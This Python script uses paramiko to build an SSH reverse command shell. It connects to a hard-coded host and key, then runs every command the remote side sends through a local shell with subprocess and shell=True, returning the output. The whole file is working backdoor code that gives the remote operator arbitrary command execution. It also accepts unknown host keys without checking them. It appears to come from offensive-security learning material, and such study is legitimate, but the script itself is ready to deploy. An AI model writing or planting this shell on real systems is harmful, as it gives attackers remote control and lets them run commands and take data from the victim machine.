import threading
import paramiko
import subprocess

def ssh_command(ip, user, pkFileName, password, command):

    client = paramiko.SSHClient()
    client.load_system_host_keys('/home/gabriel/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    pk = paramiko.RSAKey.from_private_key_file(pkFileName, password)
    client.connect(ip, username=user, pkey=pk)
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.exec_command(command)
        print(ssh_session.recv(1024))
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return

ssh_command('172.16.0.3', 'gabriel', 'pkFileName', 'password', 'ClientConnected')